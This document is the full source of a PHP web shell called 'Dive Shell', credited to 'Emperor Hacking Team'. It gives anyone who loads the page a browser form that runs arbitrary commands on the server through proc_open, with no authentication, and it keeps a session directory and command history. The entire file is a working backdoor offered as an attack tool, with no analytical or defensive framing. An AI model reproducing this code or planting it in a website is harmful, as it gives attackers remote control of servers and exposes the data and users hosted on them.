<?php

/*Emperor Hacking TEAM */
  session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
  }
  
  if (!empty($_REQUEST['command'])) {
    if (get_magic_quotes_gpc()) {
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
    }
    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
      unset($_SESSION['history'][$i]);
    
    array_unshift($_SESSION['history'], $_REQUEST['command']);
  
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
      $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {

      if ($regs[1][0] == '/') {

        $new_dir = $regs[1];
      } else {

        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
      }
      

      while (strpos($new_dir, '/./') !== false)
        $new_dir = str_replace('/./', '/', $new_dir);


      while (strpos($new_dir, '//') !== false)
        $new_dir = str_replace('//', '/', $new_dir);

      while (preg_match('|/\.\.(?!\.)|', $new_dir))
        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
      if ($new_dir == '') $new_dir = '/';
      

      if (@chdir($new_dir)) {
        $_SESSION['cwd'] = $new_dir;
      } else {
        $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
      }
      
    } else {

      chdir($_SESSION['cwd']);

      $length = strcspn($_REQUEST['command'], " \t");
      $token = substr($_REQUEST['command'], 0, $length);
      if (isset($aliases[$token]))
        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
    
      $p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);


      while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
      }

      while (!feof($io[2])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
      }
      
      fclose($io[1]);
      fclose($io[2]);
      proc_close($p);
    }
  }


  if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
  } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
  }


header('Content-Type: text/html; charset=UTF-8');

echo '<?xml version="Dive.0.1" encoding="UTF-8"?>' . "\n";
?>

<head>
  <title>Dive Shell - Emperor Hacking Team</title>
  <link rel="stylesheet" href="Simshell.css" type="text/css" />

  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

  </script>
</head>

<body   onload="init()" style="color: #00FF00; background-color: #000000">

<span style="background-color: #FFFFFF">



</body>

</body>
</html>



</span>



<p><font color="#FF0000"><span style="background-color: #000000">&nbsp;Directory: </span> <code>
<span style="background-color: #000000"><?php echo $_SESSION['cwd'] ?></span></code>
</font></p>

<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="POST" style="border: 1px solid #808080">
<div style="width: 989; height: 456">
  <p align="center"><b>
  <font color="#C0C0C0" face="Tahoma">Command:</font></b><input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="88" tabindex="1" style="border: 4px double #C0C0C0; ">
  <input type="submit" value="Submit" /> &nbsp;<font color="#0000FF">
  </font>
  &nbsp;<textarea name="output" readonly="readonly" cols="107" rows="22" style="color: #FFFFFF; background-color: #000000">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea> </p>
<p class="prompt" align="center">
  <b><font face="Tahoma" color="#C0C0C0">Rows:</font><font face="Tahoma" color="#0000FF" size="2"> </font></b> 
  <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" size="5" /></p>
<p class="prompt" align="center">
  <b><font color="#C0C0C0" face="SimSun">Edited By Emperor Hacking Team</font></b></p>
<p class="prompt" align="center">
  <font face="Tahoma" size="2" color="#808080">iM4n - FarHad - imm02tal - R$P</font><font color="#808080"><br>
&nbsp;</font></p>
</div>
</form>


<p class="prompt" align="center">
  <b><font color="#000000">&nbsp;</font><font color="#000000" size="2"> </font>
  </b></p>



</html>
